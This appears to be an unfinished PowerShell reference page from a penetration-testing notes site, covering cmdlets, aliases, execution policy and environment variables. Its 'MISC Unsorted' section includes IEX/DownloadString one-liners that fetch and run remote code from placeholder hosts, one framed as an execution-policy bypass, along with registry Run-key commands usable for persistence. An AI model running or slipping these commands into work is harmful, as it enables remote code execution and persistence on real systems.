# PowerShell

## PowerShell Commands

In PowerShell, there are three main types of commands: cmdlets, functions, and aliases.  

### Cmdlets

Cmdlet is pronounced "command-let". They are instances of .NET classes, not stand-alone executables like in other shell environments. This makes it extremely easy for third parties to extend the functionality of PowerShell without compiling new binaries.  Cmdlet names have the form "Verb-Noun" to make them easily discoverable \(according to Microsoft anyway!\).

Since cmdlets are an actual instance of a .NET class, the output from a command is a bit different than in a traditional command shell.  Instead of the common standard-in and standard-out, PowerShell returns an object that contains a number of properties of which a select number are displayed depending on the cmdlet.  Objects returned by a cmdlet often have many more discoverable properties and methods that can be manipulated and acted on by those with experience, through experimentation, or by reading the documentation.  This makes it extremely powerful.  

You can also use them in pretty much the same way as commands in a traditional shell environment without knowing any of this, though you will get much more out of it if you take the time to learn.

#### cmdlet verbs

Cmdlets are restricted to only a set list of verbs.  Nouns can be whatever you want, but should follow Third party developers and scripters are encouraged by Microsoft to only use ones from this list for consistency, but PowerShell will not deny modules that use other verbs from running. The most common verbs are **New**, **Get**, **Set**, and **Invoke**, though there are many more. You can read more about this [here](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7). 

#### The Three Core Cmdlets \(TODO:put these 5KFB6 in tables with descriptions\)

If you know how to use these three cmdlets, you can figure out how to use any other cmdlet.

<table>
  <thead>
    <tr>
      <th style="text-align:left">Cmdlet</th>
      <th style="text-align:left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Get-Command</td>
      <td style="text-align:left"></td>
    </tr>
    <tr>
      <td style="text-align:left">Get-Help</td>
      <td style="text-align:left">
        <p></p>
        <p>The Get-Help cmdlet displays basic help about cmdlets and functions, including
          examples. To get more advanced examples and information, the help index
          may need updating with <code>Update-Help</code> as it is not installed by
          default (may require admin rights). Similar to Unix <code>man</code> pages.</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Get-Member</td>
      <td style="text-align:left"></td>
    </tr>
  </tbody>
</table>

#### Other handy built-in cmdlets

| Cmdlet | Description |
| :--- | :--- |
| Get-Alias |  |
| Set-Alias |  |
| Get-ChildItem |  |
| Get-Content |  |
| Select-String |  |

### Functions

Run PowerShell scripts or C\# code directly from the terminal!

 add more...

### Aliases

There are many built-in aliases for the most commonly used cmdlets.  The developers wanted to make cmd.exe and Unix users feel at home, so many of those basic commands will function in a similar way.

<table>
  <thead>
    <tr>
      <th style="text-align:left">Cmdlet</th>
      <th style="text-align:left">Aliases</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">Get-ChildItem</td>
      <td style="text-align:left">
        <ul>
          <li>ls</li>
          <li>dir</li>
          <li>gci</li>
        </ul>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Get-Content</td>
      <td style="text-align:left">
        <ul>
          <li>cat</li>
          <li>type</li>
          <li>gc</li>
        </ul>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Set-Location</td>
      <td style="text-align:left">
        <ul>
          <li>cd</li>
          <li>chdir</li>
          <li></li>
        </ul>
      </td>
    </tr>
    <tr>
      <td style="text-align:left"></td>
      <td style="text-align:left"></td>
    </tr>
  </tbody>
</table>

## Check the Version of PowerShell

```text
$PSVersionTable
```

## Script Execution Policy

| Policy | Description |
| :--- | :--- |
| **AllSigned** | All .ps1 files must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run. |
| **Bypass** | Bypasses checks for whether files are signed, and internet origin is not verified. |
| **Default** | The default policies are **Restricted** \(client systems\) or **RemoteSigned** \(Server 2016+\) |
| **RemoteSigned** | All .ps1 files originating from the internet must be digitally signed. PowerShell prompts the user to determine if files from the signing publisher should be run. Allows local scripts and remote scripts if they are signed. |
| **Restricted** | All .ps1 files are blocked.  |
| **Undefined** | There is no execution policy set in the current scope. Reverts to **Default** policy. |

To view current execution policy check use the cmdlet `Get-ExecutionPolicy`.  If no execution policy is set in any scope, the effective execution policy is **Restricted,** which is the default for client systems \(Windows 10\) or **RemoteSigned** \(Server 2016+\). ****The policy can be changed with the cmdlet `Set-ExecutionPolicy <PolicyName>`. 

{% hint style="success" %}
For**`Execution-Policy`** bypass methods for privilege escalation and so on see [this section](windows/privilege-escalation.md#script-execution-policy-bypass-methods).
{% endhint %}

## Environment Variables

{% tabs %}
{% tab title="PowerShell" %}
Show all current environment variables in PowerShell: `Get-ChildItem Env:`
{% endtab %}

{% tab title="cmd.exe" %}
Show all current environment variables in cmd.exe: `set`
{% endtab %}
{% endtabs %}

You can assign values to Environment Variables without using a cmdlet using the following syntax:

```text
$Env:<variable> = "<value>"
```

You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Copy-Item` to change the values of environment variables. For example, to use the `Set-Item` cmdlet to append `;C:\Windows\Temp` to the value of the `$Env:PATH` environment variable, use the following syntax:

```text
Set-Item -Path Env:PATH -Value ($Env:Path + ";C:\Windows\Temp")
```

{% hint style="info" %}
In this command, the value **`$Env:Path + ";C:\Windows\Temp"`** is enclosed in parentheses so that it is interpreted as a single unit.
{% endhint %}

### Adding a Folder to PATH

{% tabs %}
{% tab title="Windows" %}
To append `C:\Windows\Temp` to the PATH , use the following syntax \(note the \(`;`\) separator\):

```text
$Env:PATH += ";C:\Windows\Temp"
```
{% endtab %}

{% tab title="Linux/MacOS" %}
On Linux or MacOS, the colon \(`:`\) in the command separates each path in the list.

```text
$Env:PATH += ":/temp"
```
{% endtab %}
{% endtabs %}

#### Using System.Environment methods <a id="using-systemenvironment-methods"></a>

The **System.Environment** class provides **GetEnvironmentVariable** and **SetEnvironmentVariable** methods that allow you to specify the scope of the variable.

The following example uses the **GetEnvironmentVariable** method to get the machine setting of `PSModulePath` and the **SetEnvironmentVariable** method to add the `C:\Program Files\Fabrikam\Modules` path to the value.PowerShellCopy

```text
$path = [Environment]::GetEnvironmentVariable('PSModulePath', 'Machine')
$newpath = $path + ';C:\Program Files\Fabrikam\Modules'
[Environment]::SetEnvironmentVariable("PSModulePath", $newpath, 'Machine')
```

## Working with Files

### Change file attributes

This can also be used to change file property flags such as Hidden, Archive, and ReadOnly.

```text
$file = (Get-ChildItem <file>) #can shorten command with gci or ls
$file.attributes #Show the files attributes
Normal

#Flip the bit of the Hidden attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
Hidden

#To remove the 'Hidden' attribute
$file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
$file.attributes
Normal
```

## MISC Unsorted

{% tabs %}
{% tab title="Windows" %}
PowerShell.exe full path: `C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`
{% endtab %}

{% tab title="Linux/MacOS" %}
PowerShell.exe full path: `/usr/local/microsoft/powershell/7/`
{% endtab %}
{% endtabs %}

Get tons of computer info in PowerShell: `Get-ComputerInfo`

Fully PowerShell version of `wget`. Retrieve file and execute remote code after downloading:

```text
powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
```

Can also use `wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html` to save the file to the local machine.  `wget` is an alias for `Invoke-WebRequest`. Adding `-Outfile` is needed to save the file to disk.

PowerShell Script Execution Bypass: \[can embed in php too! TODO: write script example of this\]:

```text
Echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | PowerShell -NoProfile -
```

PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)

### Modifying the Registry

add a new key to registry  `New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name <key_name>` then set its properties with  `New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name <key_name> -Value "<key_value>"`To edit a value that is already set use `Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name <key_name> -Value "<new_value>"`

### 

## Resources

* [http://vcloud-lab.com/Microsoft](http://vcloud-lab.com/Microsoft)
* [http://go.microsoft.com/fwlink/?LinkID=135170](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7)
* [https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/02-help-system?view=powershell-7](https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/02-help-system?view=powershell-7)

